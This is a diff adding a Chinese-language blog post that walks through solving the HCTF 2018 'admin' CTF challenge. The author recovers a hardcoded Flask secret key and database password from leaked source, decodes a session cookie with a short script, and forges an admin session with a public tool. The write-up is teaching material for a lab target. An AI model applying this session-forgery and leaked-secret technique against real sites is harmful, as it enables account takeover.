@@ -134,7 +134,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -176,6 +176,114 @@
 
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://lalalashenle.github.io/2021/06/16/CTF-HCTF-2018-admin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/skwang.jpg">
+      <meta itemprop="name" content="skwnag">
+      <meta itemprop="description" content="暨南大学 · 网络空间安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Skwang's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/06/16/CTF-HCTF-2018-admin/" class="post-title-link" itemprop="url">CTF-HCTF 2018-admin-题解</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-06-16 16:32:54 / Modified: 17:41:17" itemprop="dateCreated datePublished" datetime="2021-06-16T16:32:54+08:00">2021-06-16</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF%E9%A2%98%E8%A7%A3/" itemprop="url" rel="index"><span itemprop="name">CTF题解</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img src="/2021/06/16/CTF-HCTF-2018-admin/1.jpg"></p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/2.jpg"></p>
+<p>打开靶机，出现一个博客网站，右上角有<code>login</code>和<code>register</code>接口，点登录接口，尝试了几个SQL注入语句，没有什么收获。同时在网页源代码中发现了一点线索。</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/3.jpg"></p>
+<p>结合本题的题名就叫<code>admin</code>，猜测此题需要尝试使用admin账号登录。</p>
+<p>先看本题彩蛋，随手试了试弱口令，emmm居然。。</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/4.jpg"></p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/5.jpg"></p>
+<p>理智告诉我预期解应该不是这样的:) 继续探索探索。</p>
+<p>随便注册了个账号，登陆后右上角多了几个接口：</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/6.jpg"></p>
+<p>在<code>change password</code>接口中找到了git源码泄露：</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/7.jpg"></p>
+<p>看来题目用的是flask框架了，代码还挺多的，挑重点的几个讲一下。</p>
+<p>首先看到了仓库中有个templates文件夹，猜想可能是html模板代码。点进去后果然是这样，并且在<code>index.html</code>中发现了本题关键考点：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// https://github.com/woadsl1234/hctf_flask/blob/master/app/templates/index.html</span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，页面显示内容与<code>authenticate</code>以及<code>session[&#39;name&#39;]</code>有关，结合flask框架将session存储在客户端的特性，于是想到了flask-session伪造攻击，之前随手注册了一个名叫<code>111</code>的账号，那么如果能获取到本题session加密的密钥的话，就可以将<code>111</code>账号的<code>session[&#39;name&#39;]</code>更改为<code>admin</code>，从而以<code>admin</code>的身份登录网站。本题源码已经泄露，密钥应该就在仓库中了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+
+<p>果然，在app文件夹的配置文件中找到了密钥<code>ckj123</code>。</p>
+<p>接下来进行session的伪造工作。</p>
+<p>首先在客户端获取普通账号<code>111</code>的<code>session</code>，得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJw9kM2KwkAQhF9l6bMHJ9GL4EFJkAg9QZkYui_iT0zSmXEhKpsd8d13cMFbQzVVX9UT9pe-ujUwu_ePagT79gyzJ3wdYQYk2uZlEbMsIlxtO0wW4U4n2tQxua2jslC63Fr0myn5s1C5UdpkA_nMo68nnOxaduk4L8mTFIoNN7mxDg0NZOpfNOuOV-lA0nQsWaQdDbnRLfpd-NEdGWtRMKIIp9qkU5KQb2qFwqLd2nJSRJxQ8K3n8BrB6dZf9vfvrrp-KoR4RdKNyQUEl8ZYFj9sUq9XLAHBayniULMhl3mdLAMeTngxf9u17lBXH6dKlva4-VeuBxcEUErBCB63qn-vBmoMrz_rIGx_.YMmxQw.S01A_oerat0-rIFpwNJpnQbxU_o	</span><br></pre></td></tr></table></figure>
+
+<p>解码<code>session</code>，方法比较简单，首先将<code>session</code>按<code>&#39;.&#39;</code>进行切片，其中第一段就是<code>seesion</code>的用户数据，脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import zlib</span><br><span class="line"></span><br><span class="line">url = &#x27;你的第一段seesion切片&#x27;</span><br><span class="line">url = base64_decode(url)</span><br><span class="line">url = zlib.decompress(url)</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下：</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/8.jpg"></p>
+<p>只需要将箭头所指的<code>session[&#39;name&#39;]</code>更改为<code>admin</code>，再将其用<code>secret_key</code>进行加密，就可以完成本轮session伪造攻击了。</p>
+<p>加密session可使用一个<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">开源脚本</a>，部分计算结果如下：</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/9.jpg"></p>
+<p>利用burpsuite，将重新加密后的session放入报文中，即可得到flag。</p>
+<p><img src="/2021/06/16/CTF-HCTF-2018-admin/10.jpg"></p>
+<p align="right"><strong>致谢：小鹿同学</strong></p>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
